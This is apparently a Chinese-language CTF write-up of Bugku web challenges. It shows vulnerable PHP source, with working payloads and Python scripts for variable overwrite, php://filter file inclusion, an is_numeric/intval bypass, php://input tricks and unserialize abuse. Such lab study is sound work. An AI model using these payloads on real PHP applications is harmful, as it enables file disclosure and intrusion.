#### [web1](http://123.206.31.85:10001/)
```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
include 'flag.php';
$b='ssAEDsssss';
extract($_GET);
if(isset($a)){
	$c=trim(file_get_contents($b));
	if($a==$c){
		echo $myFlag;
	}else{
		echo '继续努力，相信flag离你不远了';
	}
}
?>
```
看到extract就知道是变量覆盖，c经过trim就已经变成空了，所以传个a=空就行了，payload：?a=


#### [流量分析](https://new.bugku.com/upload/流量分析.rar)
打开发现好多telnet流量包，追踪TCP流就直接看到flag了


#### [web11](http://123.206.31.85:3030/)
标签写的robots，于是去看下，发现shell.php，打开是一个计算md5的，写个脚本爆破一下提交就得到flag了
```python
import hashlib

key = '8d71ad'

for i in range(1, 100000000):
    result = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    if result[0:6] == key:
        print(i)
    i += 1
```

#### [web13](http://123.206.31.85:10013/)

F12审查元素，发现Headers里有个Password是base64加密的字符串，拿去解密后发现是个flag，但这貌似是假的，然后将flag里的值提交，返回了 “Can you do it faster? you cost [9874371] msec” ，那这道题和实验吧有道天下武功唯快不破有点像了，代码改下flag就出来了...

```python
import requests
import base64

s = requests.Session()
r = s.post('http://123.206.31.85:10013/index.php')
key = r.headers['Password']
flag = base64.b64decode(key).decode()[5:-1]
# print(flag)
para = {'password': flag}
r = s.post('http://123.206.31.85:10013/index.php', data=para)
print(r.text)
```



#### web20 [http://123.206.31.85:10020/](http://123.206.31.85:10020/)
写脚本跑就是了，和上面那道题差不多，但这道题有点迷，返回的密文居然与之前的密文最后一位有点变化，导致不一样也就出不了flag，但多跑几次就能出了...
```python
import requests
import re

s = requests.Session()
url = 'http://123.206.31.85:10020'
text = s.get(url).text
key = re.findall('[A-Za-z0-9]+', text)[0]
print(text)
print(key)

flag = s.get(url + '?key=' + key).text

print(flag)
```



#### [Web25](http://123.206.31.85:10025/)

鬼知道这是什么，点下载，发现下载失败，链接 http://123.206.31.85:10025/2/ziidan.txt 还404，然后试下把目录2去了，就发现了一些字典：
![](https://i.loli.net/2019/04/27/5cc3f4093abd2.jpg)

还发现了shell.php，把这些字典一个一个提交上去看看，最后一个就出flag了...


#### web3 [http://123.206.31.85:10003](http://123.206.31.85:10003)
![](https://i.loli.net/2019/04/28/5cc4831811be0.png)
上传了个图片发现什么都没有...
![](https://i.loli.net/2019/04/28/5cc483949bf9b.png)
回到主页面改改这里参数试试，改成index
![](https://i.loli.net/2019/04/28/5cc483e911acf.png)
页面正常但没回显，推测是文件包含，于是用伪协议试试：
![](https://i.loli.net/2019/04/28/5cc484ed0f3ff.png)

再base64解密就是flag了...


#### vim编辑器 [web15](http://123.206.31.85:10015/1ndex.php)

审查下元素，发现有个hint

![](https://i.loli.net/2019/05/04/5ccd49aa2d1a3.png)

拿去解密base16、32、64解下来是 `vim~` ，然后拿去百度查查，发现vim备份文件：

![](https://i.loli.net/2019/05/04/5ccd4d19e4193.png)

然后访问 `index.php~` 就得到了它的源代码了：

```php
<?php
header('content-type:text/html;charset=utf-8');
include './flag.php';
error_reporting(0);
if(empty($_GET['id'])){
    header('location:./1ndex.php');
}else{
	$id = $_GET['id'];
	if (!is_numeric($id)) {
		$id = intval($id);
		switch ($id) {
			case $id>=0:
				echo "快出去吧，走错路了～～～<br>";
				echo "这么简单都不会么？";
				break;
			case $id>=10:
				exit($flag);
				break;
			default:
				echo "你走不到这一步的!";
				break;
		}
	}
}

?>
```
传入的id不能是数字或数字字符串，所以传入数字字符串里带字母或其它符号则能让 `is_numeric` 判断为false，而intval则会取整，如果是纯字符串或字符串第一位为字母或符号则会返回0，如果是数字+字母或符号的字符串则会返回第一个字母或符号左侧的数字，所以构造这样的payload就能绕过了：

![](https://i.loli.net/2019/05/04/5ccd5c468a699.png)

![](https://i.loli.net/2019/05/04/5ccd5cb9bafc1.png)


#### [web21](http://123.206.31.85:10021/)

搜了下这貌似是是16年xctf的一道题...

F12能看到一段源码：

```php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```
这道题首先要绕过第一个if，这里用 `php://input` 能读到post提交的数据（参考：[file_get_contents("php://input")](https://blog.51cto.com/taoshi/1165499)

然后用php伪协议`php://filter/convert.base64-encode/resource=class.php`来读取 `class.php` 的内容：

![](https://i.loli.net/2019/05/10/5cd53ea643e5e.png)

```php
// class.php
<?php
error_reporting(E_ALL & ~E_NOTICE);
 
class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}
?>
```

还有 `index.php` ：

![](https://i.loli.net/2019/05/10/5cd53f11730e1.png)

```php
// index.php
<?php
error_reporting(E_ALL & ~E_NOTICE);
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    if(preg_match("/f1a9/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
}
 
?>
```

这里就能看出是要通过反序列化`$pass`来得到flag，而flag在`f1a9.php`文件里，正则匹配在这里会把它过滤了，所以没法直接读，而从`class.php`中可以知道`__toString()`这个魔法函数可以读取文件内容，这个函数会在输出对象时自动被调用，所以就可以构造序列化对象了：

![](https://i.loli.net/2019/05/10/5cd542bb03d4a.png)

可以看到在输出经过反序列化后的对象（也就是相当于直接输出原对象）时`__toString()`这个函数就被调用了，所以传入构造的序列化对象就得到flag了：

![](https://i.loli.net/2019/05/10/5cd552b45e5ac.png)










